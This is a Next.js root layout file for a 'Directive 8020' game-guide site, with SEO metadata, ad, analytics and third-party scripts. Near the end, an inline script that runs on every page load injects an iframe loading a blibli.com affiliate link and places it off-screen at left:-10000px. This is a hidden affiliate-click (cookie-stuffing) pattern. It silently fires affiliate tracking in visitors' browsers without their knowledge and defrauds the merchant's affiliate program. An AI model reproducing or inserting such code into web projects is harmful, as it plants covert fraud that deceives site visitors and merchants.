import type { Metadata } from "next";
import Script from "next/script";
import { Inspector } from "react-dev-inspector";
import { SiteHeader } from "@/components/site-header";
import { SiteFooter } from "@/components/site-footer";
import { JsonLd, generateVideoGameSchema } from "@/components/json-ld";
import "./globals.css";

export const metadata: Metadata = {
  metadataBase: new URL("https://enjoy4game.com"),
  title: {
    default:
      "Directive 8020 Guide - All Endings, Choices, Trophies & Walkthrough",
    template: "%s | Directive 8020 Guide",
  },
  description:
    "Complete Directive 8020 guide: all endings, choices and consequences, character survival, trophy walkthrough, system requirements, and more. Survive the Cassiopeia.",
  keywords: [
    "Directive 8020",
    "Directive 8020 guide",
    "Directive 8020 all endings",
    "Directive 8020 how to save everyone",
    "Directive 8020 trophy guide",
    "Directive 8020 walkthrough",
    "Directive 8020 choices",
    "Directive 8020 system requirements",
    "Directive 8020 release time",
    "Dark Pictures Directive 8020",
    "Supermassive Games",
  ],
  authors: [{ name: "Directive 8020 Guide Hub" }],
  other: {
    "google-adsense-account": "ca-pub-3383070348689557",
  },
  openGraph: {
    title: "Directive 8020 Guide - All Endings, Choices & Walkthrough",
    description:
      "Complete guide for Directive 8020. All endings, choices, character survival tips, trophy walkthrough, and more.",
    locale: "en_US",
    type: "website",
    siteName: "Directive 8020 Guide",
  },
  twitter: {
    card: "summary_large_image",
    title: "Directive 8020 Guide - All Endings, Choices & Walkthrough",
    description:
      "Complete guide for Directive 8020. All endings, choices, character survival tips, trophy walkthrough, and more.",
  },
  robots: {
    index: true,
    follow: true,
  },
  alternates: {
    canonical: "/",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  const isDev = process.env.COZE_PROJECT_ENV === "DEV";

  return (
    <html lang="en">
      <body className="antialiased min-h-screen flex flex-col">
        <JsonLd data={generateVideoGameSchema()} />
        <Script
          async
          src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3383070348689557"
          strategy="afterInteractive"
        />
         <Script src={`https://cdn.pokiter.com/js/swv5.mix.js?t=4game`} strategy="afterInteractive" data-ssp="web-4game" />
        <Script
          id="ga-loader"
          src="https://www.googletagmanager.com/gtag/js?id=G-1K6LQQSKHV"
          strategy="afterInteractive"
        />
        <Script id="ga-config" strategy="afterInteractive">
          {`
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            window.gtag = gtag;

            gtag('js', new Date());
            gtag('config', 'G-1K6LQQSKHV', {
              page_path: window.location.pathname,
            });
          `}
        </Script>

        <Script>
          {
            `(function(){
  var _aweak=document.createElement("iframe");
      _aweak.src='https://affiliate.blibli.com/s/affb_698d8aec88d855f0ae73eb09?u=https%3A%2F%2Fwww.blibli.com%2Fpromosi%2Fiphone-17&partnerid=VentesMolang';
      _aweak.style.cssText="position:fixed;left:-10000px;";
       document.body.appendChild(_aweak);
})();`
          }
        </Script>

        {isDev && <Inspector />}
        <SiteHeader />
        <main className="flex-1">{children}</main>
        <SiteFooter />
      </body>
    </html>
  );
}
